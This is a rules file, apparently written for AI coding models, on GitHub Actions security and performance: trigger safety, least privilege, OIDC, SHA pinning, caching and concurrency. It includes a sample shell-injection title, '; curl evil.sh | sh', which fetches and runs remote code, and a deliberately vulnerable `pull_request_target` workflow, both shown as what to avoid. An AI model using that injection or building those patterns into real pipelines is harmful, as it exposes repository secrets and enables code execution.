---
targetModels:
  - "Claude Fable 5"
  - "Claude Opus 5"
  - "Claude Sonnet 5"
  - "Claude 5 Family"
  - "Future Claude Models"
name: github-actions
category: DevOps
description: GitHub Actions workflows that are fast and not exploitable — trigger safety, OIDC over static keys, pinning, caching, concurrency and reusable workflows.
license: MIT
author: Agent.md maintainers
last-verified: 2026-08-23
reviewed-by: unreviewed
---
<!-- Generated from models/_canonical by scripts/build-model-variants.js.
     Edit the canonical source, not this file. Structure adapted for Claude per deep-research.md. -->
# Purpose

<purpose>
Rules specific to GitHub Actions. General pipeline design is `DevOps/cicd`; this
covers the platform's own behaviours — particularly the trigger and permission
model, which is where its real vulnerabilities live.

---
</purpose>

# Triggers decide who can run your secrets

<rules>
| Trigger | Runs as | Secrets | Safe with untrusted code |
| --- | --- | --- | --- |
| `push` | The repository | Yes | n/a |
| `pull_request` | The **merge** ref, no write token, no secrets for forks | No (forks) | Yes |
| `pull_request_target` | The **base** ref, with write token and secrets | **Yes** | **No** |
| `workflow_run` | The repository | Yes | Only with care |
| `issue_comment` | The repository | Yes | No |

**`pull_request_target` combined with checking out the pull request head is a
repository takeover.** It runs untrusted code with your secrets and a write token:

```yaml
</rules>

# ❌ Never. The fork's code executes with full repository credentials.

<rules>
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with: { ref: ${{ github.event.pull_request.head.sha }} }
  - run: npm ci && npm test                # arbitrary code from the fork
```

Use `pull_request_target` only to do something that does not execute fork code —
labelling, commenting — and never check out the head ref in it.

Untrusted input reaches you in `github.event.*`: a pull-request title, a branch
name or an issue body interpolated into a `run:` block is shell injection.

```yaml
- run: echo "${{ github.event.pull_request.title }}"      # ❌ title: "; curl evil.sh | sh"
- env: { TITLE: ${{ github.event.pull_request.title }} }  # ✅ via env, quoted
  run: echo "$TITLE"
```

---
</rules>

# Least privilege, and no static cloud keys

<rules>
```yaml
permissions:
  contents: read          # default for the whole workflow

jobs:
  deploy:
    permissions:
      contents: read
      id-token: write     # only this job gets OIDC
```

- Set `permissions` explicitly at the top. The default is broad, and a compromised
  action inherits it.
- Grant elevated scopes per **job**, never workflow-wide.
- Use **OIDC federation** to assume a cloud role rather than storing long-lived
  keys:

```yaml
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
    aws-region: eu-west-1
```

There is then no static credential to leak, rotate, or find in a log. Scope the
trust policy to the specific repository **and ref** — a policy trusting
`repo:org/*` lets any repository in the organisation deploy your production.

`GITHUB_TOKEN` expires with the job; prefer it over a personal access token. Where
a PAT is unavoidable, use a fine-grained one scoped to one repository.

---
</rules>

# Pin everything

<rules>
```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683   # v4.2.2
```

A tag is mutable: `@v4` can be repointed by the action's maintainer at any time,
which is arbitrary code execution in a workflow holding your secrets. Pin by
commit SHA with the version in a comment, and let Dependabot raise the updates.

Pin runner images to a version (`ubuntu-24.04`) rather than `ubuntu-latest`, which
moves under you and breaks builds on a schedule you do not control.

---
</rules>

# Make it fast

<rules>
```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true          # superseded pushes stop wasting runners
```

- `concurrency` with `cancel-in-progress` on pull-request workflows; never on
  deploy workflows, where cancelling mid-deploy leaves a partial rollout.
- Cache keyed on the lockfile hash, with a restore-key fallback:

```yaml
- uses: actions/setup-node@v4
  with: { node-version: 22, cache: npm }     # built-in, keyed on the lockfile
```

- Use `paths` filters so a documentation change does not run the full test matrix.
- Shard slow suites across a matrix; `fail-fast: false` when you want every shard's
  result rather than the first failure.
- Prefer `npm ci` over `npm install`, and keep `actions/cache` keys off branch
  names — a loosely keyed cache serves stale dependencies and produces failures
  that vanish on expiry.

---
</rules>

# Structure and operations

<rules>
- Extract shared logic into **reusable workflows** (`workflow_call`) or composite
  actions. Copy-pasted YAML across ten repositories drifts immediately.
- Use `environment:` for deployments to get required reviewers, wait timers and
  environment-scoped secrets.
- Mask anything sensitive (`::add-mask::`) and never `echo` a secret to debug.
  Workflow logs are readable by anyone with repository read access.
- Set `timeout-minutes` on every job. The default is six hours, and a hung job
  holds a runner for all of it.
- Set `defaults.run.shell: bash` and start scripts with `set -euo pipefail` —
  otherwise a failing command in the middle of a multi-line `run` is ignored.

---
</rules>

# Anti-patterns

<antipatterns>
| Anti-pattern | Why it fails | Fix |
| --- | --- | --- |
| `pull_request_target` + checkout head | Fork code runs with your secrets | Never combine them |
| `github.event.*` in a `run:` block | Shell injection from a title or branch name | Pass through `env:` |
| No `permissions` block | Broad default token inherited by every action | Explicit least privilege |
| Workflow-wide elevated permissions | Every job holds write access | Per-job scopes |
| Long-lived cloud keys in secrets | A leak is permanent until noticed | OIDC federation |
| OIDC trust policy scoped to an org | Any repository can deploy production | Scope to repository and ref |
| Actions pinned by tag | Mutable; arbitrary code execution | Pin by SHA |
| `ubuntu-latest` | Changes under you; scheduled breakage | Pin the runner image |
| No `concurrency` on PR workflows | Superseded runs waste runners | Cancel in progress |
| `cancel-in-progress` on deploys | Partial rollout left behind | Never on deploys |
| Cache keyed on branch | Stale dependencies; phantom failures | Key on the lockfile hash |
| No `paths` filters | Docs changes run the full matrix | Filter by path |
| No `timeout-minutes` | A hung job holds a runner for six hours | Set a timeout |
| Multi-line `run` without `pipefail` | Mid-script failures ignored | `set -euo pipefail` |
| Copy-pasted workflows across repos | Immediate drift | Reusable workflows |
| Secrets echoed for debugging | Readable by anyone with repo access | Mask; never print |

---
</antipatterns>

# Checklist

<checklist>
- [ ] No workflow combines `pull_request_target` with checking out the head ref
- [ ] No `github.event` value is interpolated directly into a shell command
- [ ] `permissions` is declared explicitly and defaults to `contents: read`
- [ ] Elevated permissions are granted per job
- [ ] Cloud access uses OIDC, scoped to this repository and ref
- [ ] No long-lived cloud credentials are stored as secrets
- [ ] Every third-party action is pinned by commit SHA
- [ ] Runner images are pinned to a version
- [ ] Pull-request workflows cancel superseded runs; deploy workflows do not
- [ ] Dependency caches are keyed on lockfile hashes
- [ ] Path filters prevent unnecessary matrix runs
- [ ] Slow suites are sharded across a matrix
- [ ] Every job sets `timeout-minutes`
- [ ] Shell steps run with `set -euo pipefail`
- [ ] Shared logic lives in reusable workflows, not copied YAML
- [ ] Deployments use environments with required reviewers
- [ ] No secret is printed or logged
</checklist>
